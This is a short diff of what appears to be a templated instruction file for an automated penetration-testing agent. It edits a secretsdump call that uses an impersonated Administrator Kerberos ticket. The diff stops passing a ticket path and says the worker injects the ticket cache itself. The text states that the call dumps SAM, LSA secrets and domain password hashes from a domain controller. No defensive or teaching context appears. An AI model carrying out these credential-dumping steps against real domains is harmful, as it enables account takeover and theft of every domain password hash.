@@ -14,13 +14,12 @@ This ticket allows you to impersonate Administrator to the target.
 secretsdump(
     target='{{ target }}',
     username='{{ user }}',
-    no_pass=True,
-    ticket_path='{{ ticket }}'{% if dc_ip %},
+    no_pass=True{% if dc_ip %},
     dc_ip='{{ dc_ip }}'{% endif %}
 )
 
 **IMPORTANT:**
-- The ticket_path sets KRB5CCNAME for Kerberos auth
+- Worker injects the ccache for `{{ user }}` automatically — do NOT pass `ticket_path`
 - no_pass=True tells secretsdump to use -k -no-pass
 - This will dump SAM, LSA secrets, and domain hashes if on a DC
 
